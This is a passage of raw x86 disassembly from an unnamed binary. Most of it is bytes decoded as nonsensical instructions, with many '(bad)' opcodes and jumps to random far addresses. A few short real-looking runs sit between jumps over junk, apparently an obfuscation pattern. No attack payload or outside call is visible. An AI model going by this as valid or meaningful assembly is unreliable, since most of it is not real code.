  413b85:	xor    DWORD PTR [ebp-0x253d1581],ebx
  413b8b:	ins    BYTE PTR es:[edi],dx
  413b8c:	sbb    BYTE PTR [ebx],bh
  413b8e:	xchg   edx,eax
  413b8f:	lea    ebp,[esi+0x58]
  413b92:	(bad)  
  413b93:	adc    eax,esi
  413b95:	in     eax,dx
  413b96:	inc    esi
  413b97:	sbb    esp,esi
  413b99:	std    
  413b9a:	sbb    al,0x38
  413b9c:	pop    ecx
  413b9d:	fdiv   st(3),st
  413b9f:	cli    
  413ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba1:	dec    ebx
  413ba2:	push   ds
  413ba3:	jg     0x413b43
  413ba5:	fadd   st(4),st
  413ba7:	jb     0x413be0
  413ba9:	iret   
  413baa:	jmp    0x74d6:0xf8df6fe9
  413bb1:	cmp    ebp,DWORD PTR [eax-0x2f98a16b]
  413bb7:	pop    eax
  413bb8:	inc    edx
  413bb9:	mov    bl,bh
  413bbb:	outs   dx,DWORD PTR ds:[esi]
  413bbc:	test   BYTE PTR [edx],al
  413bbe:	rol    DWORD PTR [ebx+0x4f5ef942],1
  413bc4:	cmp    DWORD PTR [eax],esi
  413bc6:	stos   BYTE PTR es:[edi],al
  413bc7:	adc    eax,0xb6fd226b
  413bcc:	stos   DWORD PTR es:[edi],eax
  413bcd:	pop    ebp
  413bcf:	pop    edx
  413bd0:	sbb    BYTE PTR [esi+0x2eee9242],dh
  413bd6:	push   gs
  413bd8:	sub    ebx,eax
  413bda:	shl    ecx,0x1e
  413bdd:	xor    edx,edx
  413bdf:	or     eax,edx
  413be1:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413be5:	mov    eax,DWORD PTR [ebp+0x14]
  413be8:	add    BYTE PTR [eax],cl
  413bea:	mov    eax,DWORD PTR [ebp-0x38]
  413bed:	mov    ecx,DWORD PTR [ebp-0x34]
  413bf0:	shrd   eax,ecx,0x2
  413bf4:	shr    ecx,0x2
  413bf7:	mov    ecx,DWORD PTR [ebp-0x38]
  413bfa:	mov    edx,DWORD PTR [ebp-0x34]
  413bfd:	xor    eax,edi
  413bff:	shl    ecx,0x1e
  413c02:	mov    ecx,DWORD PTR [ebp-0x38]
  413c05:	jmp    0x41418f
  413c0a:	sahf   
  413c0b:	(bad)  
  413c0c:	push   cs
  413c0d:	sub    esi,ebp
  413c0f:	sbb    BYTE PTR [eax],bl
  413c11:	inc    eax
  413c12:	adc    al,0xc8
  413c14:	sub    BYTE PTR [esi-0x572b80da],0xb
  413c1b:	repnz or al,0x16
  413c1e:	cmp    eax,0x19161604
  413c23:	mov    ah,0xf1
  413c25:	adc    eax,0xea28f5cc
  413c2a:	and    edx,ebx
  413c2c:	dec    eax
  413c2d:	push   ss
  413c2e:	dec    eax
  413c2f:	dec    edi
  413c30:	js     0x413bc8
  413c32:	xchg   BYTE PTR [edi-0x55],dl
  413c35:	adc    al,0x0
  413c37:	inc    edi
  413c38:	pop    esi
  413c39:	lods   al,BYTE PTR ds:[esi]
  413c3a:	ficomp DWORD PTR [edi]
  413c3c:	add    eax,esp
  413c3e:	push   ecx
  413c3f:	jge    0x413c41
  413c41:	xchg   DWORD PTR [ebx+0x144a4c00],ebx
  413c47:	loope  0x413c62
  413c49:	ins    DWORD PTR es:[edi],dx
  413c4a:	stc    
  413c4b:	xor    esp,ebx
  413c4d:	jmp    0xcdfa:0xf8ee4924
  413c54:	cmc    
  413c55:	mov    ecx,edi
  413c57:	call   0x7967:0xd02ebc98
  413c5e:	cmp    edi,esp
  413c60:	push   es
  413c61:	repnz xchg edx,eax
  413c63:	jmp    0x413bf5
  413c65:	js     0x413c76
  413c67:	popa   
  413c68:	fucomi st,st(3)
  413c6a:	push   ebx
  413c6b:	leave  
  413c6c:	clc    
  413c6d:	mov    ?,WORD PTR [ecx]
  413c6f:	mov    eax,ds:0x27303100
  413c74:	cli    
  413c75:	repnz pusha 
  413c77:	mov    edi,0xcf1ee40a
  413c7c:	out    0x9c,al
  413c7e:	or     al,cl
  413c80:	inc    BYTE PTR [ebx+ebp*2-0x78aade6e]
  413c87:	xchg   ecx,eax
  413c88:	cmp    esi,DWORD PTR [edi+ebp*1-0x12]
  413c8c:	in     al,0x15
  413c8e:	jnp    0x413cb5
  413c90:	dec    edi
  413c91:	pop    ecx
  413c92:	cld    
  413c93:	jno    0x413c5c
  413c95:	add    eax,0x77af6c14
  413c9a:	(bad)
  413c9f:	int    0x7d
  413ca1:	out    dx,al
  413ca2:	mov    esp,0x5ba7e614
  413ca7:	dec    ebp
  413ca8:	mov    BYTE PTR ds:0xffa39851,cl
  413cae:	fsubr  st,st(5)
  413cb0:	ins    DWORD PTR es:[edi],dx
  413cb1:	and    al,0x4e
  413cb3:	and    al,0x56
  413cb5:	mov    al,ds:0xf79c513f
  413cba:	inc    eax
  413cbb:	mov    al,cs:0x995f6add
  413cc1:	fnstenv [ebp-0x1c979cc3]
  413cc7:	pusha  
  413cc8:	fdivp  st(1),st
  413cca:	aad    0xa1
  413ccc:	or     esp,0x5bbb3709
  413cd2:	cmc    
  413cd3:	ds sub eax,0x5de63001
  413cd9:	rcr    DWORD PTR [esi],0x6d
  413cdc:	xchg   ecx,eax
  413cdd:	ret    0x1570
  413ce0:	pop    ss
  413ce1:	repnz xor BYTE PTR [ebp-0x2302fe4a],bl
  413ce8:	hlt    
  413ce9:	loopne 0x413ca0
  413ceb:	out    0x45,eax
  413ced:	retf   
  413cee:	cli    
  413cef:	arpl   WORD PTR [ebx],ax
  413cf1:	or     esp,DWORD PTR [edi]
  413cf3:	cdq    
  413cf4:	je     0x413ccc
  413cf6:	ret    
  413cf7:	pop    edx
  413cf8:	jnp    0x413d01
  413cfa:	aas    
  413cfb:	aad    0x30
  413cfd:	mov    ebp,0x34fc898a
  413d02:	cmp    BYTE PTR [ecx-0x3e],dh
  413d05:	bnd call 0x62d2aaeb
  413d0b:	pop    ebp
  413d0c:	test   al,0x23
  413d0e:	sahf   
  413d0f:	iret   
  413d10:	push   ds
  413d11:	out    dx,eax
  413d12:	xchg   esp,eax
  413d13:	cmp    al,0xea
  413d15:	jnp    0x413ce7
  413d17:	(bad)
  413d1a:	inc    esi
  413d1b:	xor    ch,BYTE PTR [ecx-0x3c957b54]
  413d21:	shl    BYTE PTR [esi+0x51],cl
  413d24:	xchg   esp,eax
  413d25:	mov    al,0xec
  413d27:	cmp    ah,BYTE PTR [ebp-0x48dcea25]
  413d2d:	cmc    
  413d2e:	call   0x47f3:0x4d9d88cb
  413d35:	xchg   ebx,eax
  413d36:	push   ds
  413d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d38:	mov    edi,edx
  413d3a:	dec    esp
  413d3b:	sbb    DWORD PTR [eax-0x6cc62a83],0xdf171771
  413d45:	aam    0xd1
  413d47:	cmc    
  413d48:	and    eax,0x917dd6c2
  413d4d:	dec    ebx
  413d4e:	daa    
  413d4f:	and    eax,0x590a8e6b
  413d54:	mov    bl,0x12
  413d56:	repnz xchg ebx,eax
  413d58:	jbe    0x413d81
  413d5a:	jnp    0x413d3a
  413d5c:	sahf   
  413d5d:	loopne 0x413d79
  413d5f:	mov    ch,0x14
  413d61:	retf   0x83bb
  413d64:	cdq    
  413d65:	fdiv   QWORD PTR [eax+0xdf99aac]
  413d6b:	cwde   
  413d6c:	lock sbb eax,0xf87486a3
  413d72:	sub    esp,DWORD PTR [eax-0x4a1de4a9]
  413d78:	out    dx,eax
  413d79:	and    eax,0xffd6638f
  413d7e:	into   
  413d7f:	pop    eax
  413d80:	add    BYTE PTR [eax+0x67807307],ah
  413d86:	test   cl,bh
  413d88:	or     BYTE PTR [esi+0x4d64ac77],bh
  413d8e:	test   DWORD PTR [ecx+0x48499ca9],esp
  413d94:	(bad)  
  413d95:	ror    DWORD PTR [edx-0x3c],1
  413d98:	pop    ebx
  413d99:	test   ebp,0xb5a13e2a
  413d9f:	(bad)  
  413da0:	repz fdivr st,st(4)
  413da3:	push   ebx
  413da4:	mov    cl,0x66
  413da6:	xchg   DWORD PTR [eax+0x18],eax
  413da9:	or     DWORD PTR [ebx],0xd
  413dac:	cmp    ebx,DWORD PTR [edi+0x3a8b0dbc]
  413db2:	aam    0x8f
  413db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413db5:	dec    eax
  413db6:	push   ebp
  413db7:	iret   
  413db8:	icebp  
  413db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dba:	and    eax,0xd813c5e3
  413dbf:	ja     0x413d9c
  413dc1:	jmp    0x3f6fd3c
  413dc6:	test   DWORD PTR [ebx-0xa],edx
  413dc9:	rol    BYTE PTR [ecx],1
  413dcb:	add    bl,al
  413dcd:	and    BYTE PTR [ecx],0x5f
  413dd0:	hlt    
  413dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dd2:	cmc    
  413dd3:	push   edi
  413dd4:	add    ebx,DWORD PTR [ecx-0x695e381f]
  413dda:	inc    edx
  413ddb:	jo     0x413e56
  413ddd:	and    ebp,DWORD PTR [edi+0x3502c752]
  413de3:	xchg   bl,dh
  413de5:	aas    
  413de6:	test   al,0xf7
  413de8:	or     ch,dl
  413dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dec:	fsub   DWORD PTR [edx+0x47af8507]
  413df2:	or     eax,0xca2c1a29
  413df7:	cmp    cl,BYTE PTR [esp+ebx*2-0x1108ce2c]
  413dfe:	pop    ss
  413dff:	out    0x61,eax
  413e01:	scas   al,BYTE PTR es:[edi]
  413e02:	or     eax,0x9df047f0
  413e07:	add    al,0x68
  413e09:	mov    ds:0xf7209854,eax
  413e0e:	imul   esp,DWORD PTR [edi],0x1d
  413e11:	xor    DWORD PTR [eax-0x11],ecx
  413e14:	mov    al,0xe1
  413e16:	dec    ebx
  413e17:	cli    
  413e18:	sahf   
  413e19:	imul   eax,DWORD PTR [edx+0x70adc285],0x46eadf24
  413e23:	mov    ecx,0xbc10cdcc
  413e28:	in     al,dx
  413e29:	mov    DWORD PTR [eax-0x19],ebx
  413e2c:	and    dh,BYTE PTR [edx-0x5]
  413e2f:	mov    si,WORD PTR [esi+0x6c]
  413e33:	xchg   edi,eax
  413e34:	sar    DWORD PTR [esi-0x28befee7],0x7d
  413e3b:	cmp    esp,ebp
  413e3d:	mov    ecx,0x3dbe37c8
  413e42:	cwde   
  413e43:	shr    DWORD PTR [ebx],1
  413e45:	js     0x413ea8
  413e47:	fsub   DWORD PTR [esi]
  413e49:	aad    0x3a
  413e4b:	push   edi
  413e4c:	out    0x80,al
  413e4e:	inc    ecx
  413e4f:	jne    0x413ddb
  413e51:	or     DWORD PTR [esi],0x26
  413e54:	mov    ss,WORD PTR [edi-0x54]
  413e57:	inc    eax
  413e58:	enter  0xf742,0x8a
  413e5c:	imul   DWORD PTR [ecx-0x78]
  413e5f:	shl    DWORD PTR [edi-0x3],1
  413e62:	dec    ebx
  413e63:	sahf   
  413e64:	addr16 mov ss,eax
  413e67:	push   edx
  413e68:	push   ebp
  413e69:	pop    ecx
  413e6a:	neg    DWORD PTR [ecx+ebp*1-0x230e9997]
  413e71:	aaa    
  413e72:	fcomp  QWORD PTR ds:0xa5f1f181
  413e78:	add    eax,0x77bd37b5
  413e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e7e:	fwait
  413e7f:	jl     0x413e1f
  413e81:	out    0xe5,eax
  413e83:	xor    eax,DWORD PTR [edi-0x470adae0]
  413e89:	repnz mov ebx,DWORD PTR [ebx-0x5e912965]
  413e90:	shl    edi,0x86
  413e93:	pushf  
  413e94:	sbb    bl,bl
  413e96:	dec    edi
  413e97:	aas    
  413e98:	mov    esi,0xecb54443
  413e9d:	push   edx
  413e9e:	stos   DWORD PTR es:[edi],eax
  413e9f:	add    edi,DWORD PTR [edx+0x5916fa18]
  413ea5:	mov    eax,ds:0x679a62ff
  413eaa:	sbb    BYTE PTR [eax],ch
  413eac:	fisub  DWORD PTR [edx+0x50]
  413eaf:	mov    al,ds:0xcb2bd105
  413eb4:	or     al,0xd7
  413eb6:	inc    esi
  413eb7:	mov    ds:0x1a7c29e0,al
  413ebc:	popf   
  413ebd:	scas   eax,DWORD PTR es:[edi]
  413ebe:	mov    eax,edx
  413ec0:	mov    WORD PTR [eax-0x784c02cd],ds
  413ec6:	imul   ebp,DWORD PTR [ecx+0x20c0732],0x1380b1e5
  413ed0:	cmp    DWORD PTR [eax-0x40],esp
  413ed3:	lock repnz xchg edx,eax
  413ed6:	xlat   BYTE PTR ds:[ebx]
  413ed7:	add    cl,cl
  413ed9:	push   ebx
  413eda:	xor    al,0xb1
  413edc:	jae    0x413ee0
  413ede:	mov    eax,0x1738cd75
  413ee3:	inc    ebx
  413ee4:	mov    al,ds:0x36d940dd
  413ee9:	popf   
  413eea:	fistp  DWORD PTR [eax+0x2e]
  413eed:	js     0x413f12
  413eef:	ret    0x3dd7
  413ef2:	sub    edi,esp
  413ef4:	or     al,ah
  413ef6:	js     0x413ed3
  413ef8:	adc    eax,0xa0608c08
  413efd:	or     DWORD PTR [edi+ebx*8+0x70],eax
  413f01:	sub    bh,BYTE PTR [edx]
  413f03:	retf   
  413f04:	mov    cl,0x57
  413f06:	icebp  
  413f07:	adc    dx,WORD PTR [eax+0x3d93ca74]
  413f0e:	pusha  
  413f0f:	sahf   
  413f10:	sar    BYTE PTR [edx-0x5c],0x22
  413f14:	cmp    BYTE PTR es:[esi+eiz*4-0x4],bl
  413f19:	xor    eax,0x9e21e29c
  413f1e:	mov    esp,DWORD PTR [ebx-0x21]
  413f21:	add    dh,BYTE PTR [ebx-0x4bdf10be]
  413f27:	popf   
  413f28:	mov    dh,0xba
  413f2a:	pop    edi
  413f2b:	cmc    
  413f2c:	pop    ebx
  413f2d:	sar    BYTE PTR [edx],1
  413f2f:	dec    edx
  413f30:	(bad)  
  413f31:	daa    
  413f32:	xor    BYTE PTR [esp+ebx*1-0x23],bl
  413f36:	not    ebp
  413f38:	mov    bh,0x49
  413f3a:	gs dec edi
  413f3c:	mov    eax,0x8657366a
  413f41:	xchg   ecx,eax
  413f42:	mov    edx,DWORD PTR [esi-0x68]
  413f45:	cld    
  413f46:	dec    edi
  413f47:	mov    ecx,0x4b4118c5
  413f4c:	shl    DWORD PTR [ecx+0x7316c060],1
  413f52:	cli    
  413f53:	sbb    al,0x27
  413f55:	int3   
  413f56:	mov    edx,0xb819a3c6
  413f5b:	ja     0x413f1b
  413f5d:	dec    edx
  413f5e:	imul   ecx,DWORD PTR [edi+ebp*1-0x661fe436],0x4c3e43d0
  413f69:	in     eax,dx
  413f6a:	ins    BYTE PTR es:[edi],dx
  413f6b:	data16 add al,0x5e
  413f6e:	loopne 0x413f95
  413f70:	shl    BYTE PTR [edi+0x2f],1
  413f73:	aaa    
  413f74:	push   esi
  413f75:	pop    ebx
  413f76:	sar    BYTE PTR [ebp+0xf],0x35
  413f7a:	mov    esi,0x2a4ed9f6
  413f7f:	test   al,0x3e
  413f81:	or     DWORD PTR [ebx-0xf],0xffffffcc
  413f85:	sbb    ecx,edi
  413f87:	push   es
  413f88:	mov    ?,eax
  413f8a:	add    al,0x90
  413f8c:	inc    esp
  413f8d:	push   0x6870c17b
  413f92:	fmul   QWORD PTR [eax+0x74]
  413f95:	rcl    dl,cl
  413f97:	lods   eax,DWORD PTR ds:[esi]
  413f98:	mov    dl,0xb
  413f9a:	aam    0xcf
  413f9c:	imul   ecx,DWORD PTR [edx-0x48d92de0],0xa
  413fa3:	add    al,0x8f
  413fa5:	jne    0x413f56
  413fa7:	popa   
  413fa8:	xchg   esp,eax
  413fa9:	jp     0x413f4e
  413fab:	push   eax
  413fac:	cmp    DWORD PTR [ecx+0x7fcbc12a],edx
  413fb2:	fsub   QWORD PTR [ebp+0x59aa166f]
  413fb8:	pop    ecx
  413fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fba:	jns    0x41400a
  413fbc:	ror    BYTE PTR [ebp+0x67],1
  413fbf:	mov    cl,0xb4
  413fc1:	pop    es
  413fc2:	mov    esp,0x53d9b455
  413fc7:	mov    edi,0x7676b928
  413fcc:	into   
  413fcd:	sbb    eax,DWORD PTR [esi+edx*4]
  413fd0:	cwde   
  413fd1:	in     eax,0xe2
  413fd3:	out    dx,eax
  413fd4:	out    0xdc,eax
  413fd6:	ficomp DWORD PTR [esi+ebx*4]
  413fd9:	xchg   BYTE PTR [edx],ah
  413fdb:	sar    BYTE PTR [edi-0xc],0x1f
  413fdf:	daa    
  413fe0:	xchg   edi,eax
  413fe1:	xchg   ebx,eax
  413fe2:	loopne 0x413fc0
  413fe4:	and    BYTE PTR [ebp+0x7364d453],ch
  413fea:	mov    ebx,0x58c93746
  413fef:	in     al,dx
  413ff0:	imul   ebp,DWORD PTR [edi-0x4b],0x9c0dec60
  413ff7:	ins    DWORD PTR es:[edi],dx
  413ff8:	out    0x1c,eax
  413ffa:	add    eax,0x3b8b772f
  413fff:	std    
  414000:	jne    0x413fed
  414002:	jne    0x413fe6
  414004:	add    BYTE PTR [eax+0x24896329],0x7f
  41400b:	repz fild WORD PTR [edx-0x5d0d5c73]
  414012:	and    cl,BYTE PTR [ebp-0x6042475b]
  414018:	fs jbe 0x413fa8
  41401b:	mov    ebp,esi
  41401d:	mov    ds:0x60debf4e,al
  414022:	(bad)  [edi-0x2b]
  414025:	push   0xffffffbb
  414027:	in     eax,0x4
  414029:	pusha  
  41402a:	stos   DWORD PTR es:[edi],eax
  41402b:	inc    edi
  41402c:	add    al,0xee
  41402e:	jecxz  0x414080
  414030:	mov    cl,0x69
  414032:	xor    esi,DWORD PTR [ecx+0x11]
  414035:	sub    al,0x5b
  414037:	sar    BYTE PTR [ecx-0x66b24481],cl
  41403d:	ror    BYTE PTR [esi-0x3435aea9],cl
  414043:	stc    
  414044:	js     0x414030
  414046:	mov    ch,0x5c
  414048:	out    dx,al
  414049:	mov    ah,0x4
  41404b:	adc    bl,BYTE PTR [edi+ebp*8+0x54]
  41404f:	push   eax
  414050:	test   eax,0x84e8907e
  414055:	call   0x9fcf:0x86b493e
  41405c:	push   esi
  41405d:	push   edx
  41405e:	mov    ch,0xe9
  414060:	adc    ah,BYTE PTR [edi+0x2b9fd656]
  414066:	mov    ebx,0xed2b66f0
  41406b:	sub    DWORD PTR [ebx+0x66f07ecf],edi
  414071:	cmp    eax,0x803dbf28
  414076:	push   esp
  414077:	or     ah,ch
  414079:	test   BYTE PTR [edx-0x54],dh
  41407c:	dec    esi
  41407d:	scas   al,BYTE PTR es:[edi]
  41407e:	es jl  0x414004
  414081:	loope  0x4140d2
  414083:	mov    DWORD PTR [ebp-0x81d170d],esi
  414089:	lds    esp,FWORD PTR [ebp+ebp*1+0x7a93fcc8]
  414090:	ins    DWORD PTR es:[edi],dx
  414091:	jmp    0x21913b1c
  414096:	les    ecx,FWORD PTR [esp+ebp*8]
  414099:	clc    
  41409a:	mov    ds:0xa382af1,al
  41409f:	loopne 0x4140d8
  4140a1:	mov    al,0xd4
  4140a3:	es hlt 
  4140a5:	repz test DWORD PTR [edi+0x7b],edi
  4140a9:	mov    esp,0x3fd5eb2
  4140ae:	jb     0x41409f
  4140b0:	(bad)  
  4140b1:	fxch   st(6)
  4140b3:	jb     0x41406b
  4140b5:	mov    eax,DWORD PTR [ebp-0x712e2cab]
  4140bb:	aaa    
  4140bc:	mov    WORD PTR [ebx+0x3a4e8b9f],?
  4140c2:	add    bp,WORD PTR ds:0x972b4294
  4140c9:	fdivr  QWORD PTR ds:0x897617ff
  4140cf:	(bad)  
  4140d0:	cwde   
  4140d1:	sti    
  4140d2:	loopne 0x4140d4
  4140d4:	and    BYTE PTR [esp+edi*2],al
  4140d7:	sub    ebx,DWORD PTR [edi+0x7]
  4140da:	cli    
  4140db:	push   edx
  4140dc:	js     0x4140c6
  4140de:	nop
  4140df:	shl    DWORD PTR [esi],1
  4140e1:	pop    ss
  4140e2:	and    bh,BYTE PTR [ebx+0x194d7f58]
  4140e8:	adc    eax,0x25191fc1
  4140ed:	sbb    dl,0x14
  4140f0:	sub    esi,DWORD PTR [esi]
  4140f2:	ret    
  4140f3:	push   edi
  4140f4:	mov    ch,0xc6
  4140f6:	call   0xe255f489
  4140fb:	call   0x7d411290
  414100:	into   
  414101:	pop    ebx
  414102:	scas   al,BYTE PTR es:[edi]
  414103:	adc    al,BYTE PTR [edx]
  414105:	cdq    
  414106:	sbb    BYTE PTR [esi],bl
  414108:	jmp    0xe29e5e00
  41410d:	ret    
  41410e:	mov    ebx,0xf2abd015
  414113:	in     eax,0x47
  414115:	dec    ebp
  414116:	mov    BYTE PTR [ecx-0x40],0x14
  41411a:	(bad)  
  41411b:	loopne 0x414190
  41411d:	push   ecx
  41411e:	(bad)  
  41411f:	mov    al,ds:0x62d3a903
  414124:	add    BYTE PTR [edi-0x5528f203],0x39
  41412b:	rcr    edx,0xe5
  41412e:	jmp    0x414143
  414130:	dec    eax
  414131:	aad    0x4e
  414133:	int    0xd6
  414135:	outs   dx,BYTE PTR ds:[esi]
  414136:	lods   eax,DWORD PTR ds:[esi]
  414137:	push   0x6b
  414139:	leave  
  41413a:	xor    DWORD PTR [ecx-0x50],ebp
  41413d:	into   
  41413e:	ins    BYTE PTR es:[edi],dx
  41413f:	mov    ds:0x94943ca7,eax
  414144:	mov    cl,0xeb
  414146:	sub    bh,BYTE PTR [eax-0x4d882a3c]
  41414c:	or     ah,dl
  41414e:	imul   DWORD PTR [edx+0x3b797175]
  414154:	cdq    
  414155:	jae    0x414118
  414157:	push   esi
  414158:	xor    eax,0x9b1ab3ff
  41415d:	xchg   BYTE PTR [ebp-0x3e4d7771],bl
  414163:	int    0x78
  414165:	adc    ebp,ecx
  414167:	and    al,0x72
  414169:	xchg   BYTE PTR [edx-0x924e450],al
  41416f:	mov    edx,cs
  414171:	out    dx,al
  414172:	xor    eax,DWORD PTR [eax+0x5f33a2b2]
  414178:	cmp    al,0xa6
  41417a:	iret   
  41417b:	adc    edx,eax
  41417d:	cmp    ebp,DWORD PTR [esi+eiz*2+0x4]
  414181:	or     al,0xa3
  414183:	xor    ebp,DWORD PTR [esi+0x2d9dd9a6]
  414189:	dec    edi
  41418a:	scas   eax,DWORD PTR es:[edi]
  41418b:	fisub  WORD PTR [esi]
  41418d:	add    al,0x63
  41418f:	xor    edx,edx
  414191:	or     eax,edx
  414193:	mov    edx,DWORD PTR [ebp-0x34]
  414196:	add    eax,DWORD PTR ds:0x422298
  41419c:	shrd   ecx,edx,0x2
  4141a0:	xor    ecx,edi
  4141a2:	shr    edx,0x2
  4141a5:	mov    edx,DWORD PTR [ebp-0x38]
  4141a8:	mov    edi,DWORD PTR [ebp-0x34]
  4141ab:	xor    edi,edi
  4141ad:	jmp    0x414737
  4141b2:	jb     0x414219
  4141b4:	(bad)  
  4141b5:	jecxz  0x414157
  4141b7:	sub    BYTE PTR [edx],dl
  4141b9:	push   esp
  4141ba:	xchg   edx,eax
  4141bb:	das    
  4141bc:	mov    esp,0xa034dfae
  4141c1:	outs   dx,BYTE PTR ds:[esi]
  4141c2:	inc    eax
  4141c3:	lock or al,0x16
  4141c6:	cmp    eax,0x32161604
  4141cb:	mov    ebx,0x4b702cfc
  4141d0:	stos   DWORD PTR es:[edi],eax
  4141d1:	outs   dx,DWORD PTR ds:[esi]
  4141d2:	inc    eax
  4141d3:	jg     0x4141b0
  4141d5:	adc    BYTE PTR [edx-0x7b],bl
  4141d8:	inc    ebp
  4141d9:	xor    eax,0x835b399f
  4141de:	lock popa 
  4141e0:	gs inc eax
  4141e2:	and    DWORD PTR [ebp-0x1e],eax
  4141e5:	cmp    DWORD PTR ds:[ebx+0x26],edi
  4141e9:	(bad)  
  4141eb:	or     DWORD PTR [eax],0xffffffdf
  4141ee:	xor    ebx,edi
  4141f0:	in     eax,dx
  4141f1:	(bad)  
  4141f2:	cmc    
  4141f3:	cmp    al,0x46
  4141f5:	pop    edx
  4141f6:	shl    DWORD PTR [edi+ebp*2],cl
  4141f9:	jbe    0x41421f
  4141fb:	shr    DWORD PTR [esp+eax*2-0x15],cl
  4141ff:	xor    edx,DWORD PTR ds:[ebp+0x5ec8b19a]
  414206:	jae    0x41421a
  414208:	push   cs
  414209:	push   esi
  41420a:	mov    bl,0x96
  41420c:	xchg   edx,eax
  41420d:	pop    edx
  41420e:	retf   
  41420f:	(bad)  
  414210:	xchg   esp,eax
  414211:	add    eax,0x263aaeb1
  414216:	in     al,dx
  414217:	mov    ?,WORD PTR [edi]
  414219:	inc    edi
  41421a:	sub    edi,DWORD PTR [edi-0x34]
  41421d:	inc    esi
  41421e:	repz (bad) 
  414220:	clc    
  414221:	mov    BYTE PTR [edi+0x56c6af17],cl
  414227:	jp     0x4141fa
  414229:	xchg   ebx,eax
  41422a:	cli    
  41422b:	stos   DWORD PTR es:[edi],eax
  41422c:	sti    
  41422d:	rcr    BYTE PTR [eax-0x6a2d3bfd],cl
  414233:	jne    0x41423c
  414235:	data16 hlt 
  414237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414238:	sar    DWORD PTR [ebx-0x4a84c5e1],1
  41423e:	fnstenv [ebp-0x5c13f6ca]
  414244:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414246:	push   0x52b46109
  41424b:	mov    BYTE PTR [ecx-0x55212380],ah
  414251:	and    DWORD PTR [edx-0x6ffba0c4],esp
  414257:	retf   0xa20e
  41425a:	mov    ebp,0x8b2bff3f
  41425f:	mov    ebx,0x5d15cedb
  414264:	adc    eax,0xc30cb0eb
  414269:	mov    ecx,0xc8ab75b5
  41426e:	jne    0x414281
  414270:	xor    al,0x57
  414272:	int3   
  414273:	or     al,BYTE PTR [eax+0x5066ea5f]
  414279:	icebp  
  41427a:	lahf   
  41427b:	jno    0x41425e
  41427d:	hlt    
  41427e:	loopne 0x414239
  414280:	push   0xd2c4d838
  414285:	jge    0x414225
  414287:	bound  edx,QWORD PTR [edi+0x30]
  41428a:	sbb    BYTE PTR [esi+0x43400e8],dh
  414290:	mov    dl,0x2d
  414292:	mov    ebx,0xf2900595
  414297:	out    dx,eax
  414298:	jns    0x4142df
  41429a:	pop    esi
  41429b:	fisttp QWORD PTR [ecx]
  41429d:	jae    0x41422e
  41429f:	rol    BYTE PTR [eax],0x72
  4142a2:	stos   BYTE PTR es:[edi],al
  4142a3:	and    eax,edx
  4142a5:	jg     0x4142a9
  4142a7:	sahf   
  4142a8:	xchg   esp,eax
  4142a9:	push   edx
  4142aa:	pop    ebp
  4142ab:	retf   0x2133
  4142ae:	nop
  4142af:	idiv   bl
  4142b1:	mov    ch,dl
  4142b3:	and    DWORD PTR [edx],edx
  4142b5:	push   0xffffffb3
  4142b7:	adc    bh,BYTE PTR ds:0x91a8ac61
  4142bd:	nop
  4142be:	mov    ecx,DWORD PTR [edi+0x1dfa83c5]
  4142c4:	push   ds
  4142c5:	jecxz  0x414300
  4142c7:	out    0xab,eax
  4142c9:	or     ah,bh
  4142cb:	imul   esp,edx,0x60
  4142ce:	clc    
  4142cf:	add    edx,DWORD PTR [edi-0x1d]
  4142d2:	jns    0x4142fa
  4142d4:	sbb    al,0xc4
  4142d6:	jg     0x414283
  4142d8:	xchg   edi,eax
  4142d9:	fcomp  DWORD PTR [ebx+ebp*4]
  4142dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142dd:	dec    edi
  4142de:	pop    es
  4142df:	adc    DWORD PTR [edi],0xffffff95
  4142e2:	sbb    DWORD PTR [edi+0x16a9d9ff],edx
  4142e8:	pop    ds
  4142e9:	push   edx
  4142ea:	mov    dl,0x8
  4142ec:	icebp  
  4142ed:	cmp    ecx,DWORD PTR [ecx]
  4142ef:	inc    eax
  4142f0:	iret   
  4142f1:	pushf  
  4142f2:	(bad)  
  4142f3:	adc    DWORD PTR [bx-0x5a92],ecx
  4142f8:	test   BYTE PTR [ebp+ebp*8+0x601964da],0x95
  414300:	jecxz  0x414358
  414302:	mov    cl,0x4e
  414304:	push   es
  414305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414306:	std    
  414307:	nop
  414308:	push   ds
  414309:	mov    ecx,eax
  41430b:	aas    
  41430c:	or     eax,0x23153aca
  414311:	in     al,0x2c
  414313:	fwait
  414314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414315:	push   ecx
  414316:	cmp    eax,0x665135ed
  41431b:	and    dh,dh
  41431d:	repz sbb eax,ebx
  414320:	pop    edi
  414321:	lahf   
  414322:	sub    al,0x46
  414324:	mov    edi,0x5e42bc40
  414329:	in     eax,dx
  41432a:	leave  
  41432b:	sbb    ebp,esi
  41432d:	cdq    
  41432e:	adc    al,0xea
  414330:	mov    bl,0xa
  414332:	out    dx,eax
  414333:	mov    WORD PTR [esi-0x4d2568ef],?
  414339:	mov    ecx,DWORD PTR [ebp+0x777b2a42]
  41433f:	std    
  414340:	xor    DWORD PTR [esp+esi*2-0x6296871a],edi
  414347:	stos   DWORD PTR es:[edi],eax
  414348:	loopne 0x41435c
  41434a:	outs   dx,DWORD PTR ds:[esi]
  41434b:	iret   
  41434c:	mov    ch,0x48
  41434e:	push   ebx
  41434f:	push   esp
  414350:	cli    
  414351:	add    ebx,DWORD PTR [esi]
  414353:	rol    DWORD PTR [edx+0x5a4f1a32],cl
  414359:	jne    0x414345
  41435b:	div    DWORD PTR [esi]
  41435d:	mov    dl,0x89
  41435f:	fs ss pop eax
  414362:	jp     0x4142f9
  414364:	retf   
  414365:	adc    eax,0x60ba42cc
  41436a:	jne    0x414392
